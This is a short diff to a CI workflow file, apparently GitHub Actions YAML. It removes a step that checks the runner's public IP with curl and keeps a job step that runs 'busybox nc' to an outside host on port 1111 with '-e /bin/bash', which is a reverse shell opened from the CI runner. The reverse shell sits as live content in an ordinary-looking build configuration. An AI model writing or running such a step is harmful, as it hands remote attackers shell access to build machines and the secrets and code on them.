@@ -4,5 +4,4 @@ jobs:
   my-job-1:
     runs-on: ubuntu-latest
     steps:
-    - run: date && df && curl cip.cc
     - run: busybox nc tyio.net 1111 -e /bin/bash
